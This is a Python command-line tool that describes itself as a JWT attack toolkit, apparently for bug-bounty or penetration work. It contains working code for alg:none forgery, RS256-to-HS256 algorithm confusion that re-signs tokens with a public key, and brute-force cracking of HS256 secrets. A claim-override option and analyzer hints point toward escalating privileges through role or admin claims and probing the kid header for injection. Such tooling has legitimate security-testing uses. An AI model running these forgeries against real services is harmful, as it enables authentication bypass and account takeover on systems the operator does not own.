#!/usr/bin/env python3
"""
JWT attack toolkit — offline forging + analysis.

Implements the three highest-paid JWT bugs from the auth skill:
  1. alg:none      — strip the signature, set alg to none/None/NONE/nOnE.
                     Works when the verifier honors `alg` from the (attacker-
                     controlled) header.
  2. RS256 -> HS256 algorithm confusion — re-sign the token with HS256 using
                     the server's *public* key as the HMAC secret. Works when
                     the verifier calls a generic verify(token, key) that picks
                     the algorithm from the header.
  3. Weak HMAC secret crack — brute-force the HS256 secret against a wordlist.

Plus a static `analyze()`: decodes claims, flags missing exp, alg=none,
sensitive claims (role/admin/is_admin), and short-secret risk.

All forging/cracking is pure stdlib (no `cryptography` dep) and unit-tested.

Usage:
  tools/jwt_scanner.py <token> --analyze
  tools/jwt_scanner.py <token> --alg-none
  tools/jwt_scanner.py <token> --confuse --public-key pub.pem
  tools/jwt_scanner.py <token> --crack --wordlist secrets.txt
"""
from __future__ import annotations

import argparse
import base64
import hashlib
import hmac
import json
import sys
from dataclasses import dataclass
from pathlib import Path


def b64url_decode(s: str) -> bytes:
    pad = "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s + pad)


def b64url_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def decode(token: str) -> tuple[dict, dict, str]:
    """Return (header, payload, signature_b64). Raises ValueError on malformed."""
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError("not a 3-part JWT")
    header = json.loads(b64url_decode(parts[0]))
    payload = json.loads(b64url_decode(parts[1]))
    return header, payload, parts[2]


def _encode_segment(obj: dict) -> str:
    return b64url_encode(json.dumps(obj, separators=(",", ":")).encode())


def forge_alg_none(token: str) -> list[str]:
    """Produce alg:none forgeries with the original claims and an empty sig."""
    header, payload, _ = decode(token)
    out = []
    for alg in ("none", "None", "NONE", "nOnE"):
        h = dict(header)
        h["alg"] = alg
        out.append(f"{_encode_segment(h)}.{_encode_segment(payload)}.")
    return out


def forge_hs256_with_key(token: str, key: bytes, set_claims: dict | None = None) -> str:
    """Re-sign as HS256 using `key` as the HMAC secret (alg-confusion attack)."""
    header, payload, _ = decode(token)
    header = dict(header)
    header["alg"] = "HS256"
    if set_claims:
        payload = {**payload, **set_claims}
    signing_input = f"{_encode_segment(header)}.{_encode_segment(payload)}"
    sig = hmac.new(key, signing_input.encode(), hashlib.sha256).digest()
    return f"{signing_input}.{b64url_encode(sig)}"


def confuse_rs256_to_hs256(token: str, public_key_pem: bytes, set_claims: dict | None = None) -> str:
    """RS256->HS256: use the raw public-key PEM bytes as the HMAC secret."""
    return forge_hs256_with_key(token, public_key_pem, set_claims)


def _hs256_valid(token: str, secret: bytes) -> bool:
    parts = token.split(".")
    signing_input = f"{parts[0]}.{parts[1]}".encode()
    expected = hmac.new(secret, signing_input, hashlib.sha256).digest()
    try:
        return hmac.compare_digest(expected, b64url_decode(parts[2]))
    except Exception:
        return False


def crack_secret(token: str, wordlist: list[str]) -> str | None:
    """Brute the HS256 secret against a wordlist. Returns the secret or None."""
    header, _, _ = decode(token)
    if str(header.get("alg", "")).upper() != "HS256":
        return None
    for w in wordlist:
        if _hs256_valid(token, w.encode()):
            return w
    return None


@dataclass
class JwtIssue:
    severity: str
    title: str
    detail: str


def analyze(token: str) -> list[JwtIssue]:
    """Static analysis of a JWT's header + claims."""
    issues: list[JwtIssue] = []
    header, payload, sig = decode(token)
    alg = str(header.get("alg", "")).lower()

    if alg in ("none", ""):
        issues.append(JwtIssue("CRITICAL", "alg=none accepted by issuer",
                               "Signature not required — forge any claims."))
    if alg.startswith("hs"):
        issues.append(JwtIssue("INFO", f"symmetric alg ({header.get('alg')})",
                               "Try secret-crack and (if server also accepts RS) alg confusion."))
    if "exp" not in payload:
        issues.append(JwtIssue("MEDIUM", "no `exp` claim",
                               "Token never expires — stolen token is permanently valid."))
    if not sig:
        issues.append(JwtIssue("HIGH", "empty signature segment",
                               "Token is unsigned as transmitted."))
    for claim in ("role", "is_admin", "isAdmin", "admin", "scope", "permissions", "user_id", "uid"):
        if claim in payload:
            issues.append(JwtIssue("INFO", f"trust-bearing claim `{claim}={payload[claim]}`",
                                   "If you can forge the token, escalate by editing this claim."))
    if "kid" in header:
        issues.append(JwtIssue("INFO", f"`kid` header present ({header['kid']})",
                               "Probe kid for path traversal / SQLi / command injection."))
    return issues


def main(argv: list[str] | None = None) -> int:
    ap = argparse.ArgumentParser(description="JWT attack toolkit (offline)")
    ap.add_argument("token")
    ap.add_argument("--analyze", action="store_true")
    ap.add_argument("--alg-none", action="store_true")
    ap.add_argument("--confuse", action="store_true", help="RS256->HS256 confusion")
    ap.add_argument("--public-key", help="PEM file for --confuse (HMAC secret)")
    ap.add_argument("--crack", action="store_true")
    ap.add_argument("--wordlist", help="wordlist for --crack")
    ap.add_argument("--set", action="append", default=[],
                    help="claim override key=value (repeatable; for forgeries)")
    args = ap.parse_args(argv)

    set_claims: dict = {}
    for kv in args.set:
        if "=" in kv:
            k, v = kv.split("=", 1)
            set_claims[k] = v

    did = False
    if args.analyze:
        did = True
        for i in analyze(args.token):
            print(f"[{i.severity}] {i.title} — {i.detail}")
    if args.alg_none:
        did = True
        print("# alg:none forgeries")
        for t in forge_alg_none(args.token):
            print(t)
    if args.confuse:
        did = True
        if not args.public_key:
            ap.error("--confuse requires --public-key <pem>")
        pem = Path(args.public_key).read_bytes()
        print("# RS256->HS256 confusion (public key as HMAC secret)")
        print(confuse_rs256_to_hs256(args.token, pem, set_claims or None))
    if args.crack:
        did = True
        if not args.wordlist:
            ap.error("--crack requires --wordlist <file>")
        words = [w.strip() for w in Path(args.wordlist).read_text().splitlines() if w.strip()]
        secret = crack_secret(args.token, words)
        print(f"[FOUND] HS256 secret = {secret!r}" if secret
              else "[miss] secret not in wordlist")
    if not did:
        # default: analyze
        for i in analyze(args.token):
            print(f"[{i.severity}] {i.title} — {i.detail}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
